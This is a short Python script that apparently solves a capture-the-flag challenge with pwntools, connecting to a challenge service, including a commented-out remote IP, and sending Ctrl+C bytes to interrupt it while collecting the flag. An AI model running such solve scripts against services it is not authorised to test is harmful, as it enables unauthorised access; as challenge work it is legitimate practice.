from pwn import *

HOST, PORT = "localhost", 1337
#HOST, PORT = "34.170.146.252", 21066
p = remote(HOST, PORT)

flag = b""

while len(flag) < 1024:
    flag += p.recv(timeout=1)
    time.sleep(0.1)
    p.send(b"\x03")  # send Ctrl+C to interrupt the sleep
    print(flag.decode())

print(flag)
